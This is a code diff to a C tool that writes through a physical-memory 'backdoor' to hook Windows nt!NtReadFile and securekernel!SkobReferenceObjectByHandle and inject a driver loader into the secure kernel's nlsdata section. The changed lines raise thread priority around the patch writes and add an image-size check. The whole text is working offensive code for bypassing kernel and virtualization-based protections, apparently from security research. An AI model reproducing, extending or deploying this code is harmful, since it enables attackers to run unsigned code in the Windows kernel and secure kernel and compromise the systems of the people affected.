@@ -456,7 +456,7 @@ _nt_found:
 
     if (driver_image_size > nt_pagekd_size)
     {
-        printf("ERROR: Driver image is too large\n");
+        printf("ERROR: Driver loader image is too large\n");
         goto _end;
     }
 
@@ -795,12 +795,15 @@ _nt_found:
     *(uint32_t *)(nt_func_jump + 2) = 0;
     *(uint64_t *)(nt_func_jump + 6) = driver_base_virt + driver_new_NtReadFile;
 
+    int priority = bd_priority_raise();
+
     // overwrite nt!NtReadFile()
     if (backdoor_phys_write(nt_func_phys, nt_func_jump, nt_func_saved_size) != 0)
     {
         goto _end;   
     }
 
+    bd_priority_revert(priority);
     backdoor_invalidate_caches();
 
     printf(
@@ -861,12 +864,15 @@ _nt_found:
     
     printf("[+] Performing cleanup...\n");
 
+    priority = bd_priority_raise();
+
     // restore patched function
     if (backdoor_phys_write(nt_func_phys, nt_func_buff, nt_func_saved_size) != 0)
     {
         goto _end;   
     }
 
+    bd_priority_revert(priority);
     bd_sleep(1000);    
 
     for (uint32_t i = 0; i < driver_image_size; i += PAGE_SIZE)
@@ -1623,6 +1629,12 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
 
     printf("[+] nlsdata section is at securekernel+%x (size: 0x%x)\n", sk_nlsdata_addr, sk_nlsdata_size);
 
+    if (loader_size > (int)sk_nlsdata_size)
+    {
+        printf("ERROR: Driver loader image is too large\n");
+        goto _end;
+    }
+
     // allocate memory for secure kernel image
     uint8_t *image_sk = (uint8_t *)malloc(sk_size);
     if (image_sk)
@@ -1919,12 +1931,15 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     *(uint32_t *)(sk_func_jump + 2) = 0;
     *(uint64_t *)(sk_func_jump + 6) = mem + driver_new_func;
 
+    int priority = bd_priority_raise();
+
     // overwrite securekernel!SkobReferenceObjectByHandle()
     if (backdoor_phys_write(func_addr_phys, sk_func_jump, sk_func_saved_size) != 0)
     {
         goto _end;
     }
 
+    bd_priority_revert(priority);
     backdoor_invalidate_caches();
 
     printf(
@@ -1966,12 +1981,15 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
 
     printf("[+] Performing cleanup...\n");
 
+    priority = bd_priority_raise();
+
     // restore patched function
     if (backdoor_phys_write(func_addr_phys, sk_func_buff, sk_func_saved_size) != 0)
     {
         goto _end;
     }
 
+    bd_priority_revert(priority);
     bd_sleep(1000);
 
     for (uint32_t i = 0; i < saved_data_size; i += PAGE_SIZE)
@@ -2094,12 +2112,15 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
     *(uint32_t *)(sk_func_jump + 2) = 0;
     *(uint64_t *)(sk_func_jump + 6) = image_addr + driver_new_func;
 
+    priority = bd_priority_raise();
+
     // overwrite securekernel!SkobReferenceObjectByHandle()
     if (backdoor_phys_write(func_addr_phys, sk_func_jump, sk_func_saved_size) != 0)
     {
         goto _end;
     }
 
+    bd_priority_revert(priority);
     backdoor_invalidate_caches();
 
     printf(
@@ -2149,11 +2170,15 @@ int backdoor_sk_inject(SK_INFO *sk_info, uint64_t sk_addr_virt, uint64_t *payloa
 
     printf("[+] Performing cleanup...\n");
 
+    priority = bd_priority_raise();
+
     // restore patched function
     if (backdoor_phys_write(func_addr_phys, sk_func_buff, sk_func_saved_size) != 0)
     {
         goto _end;
     }
+
+    bd_priority_revert(priority);
 
     printf("[+] Done\n");
 
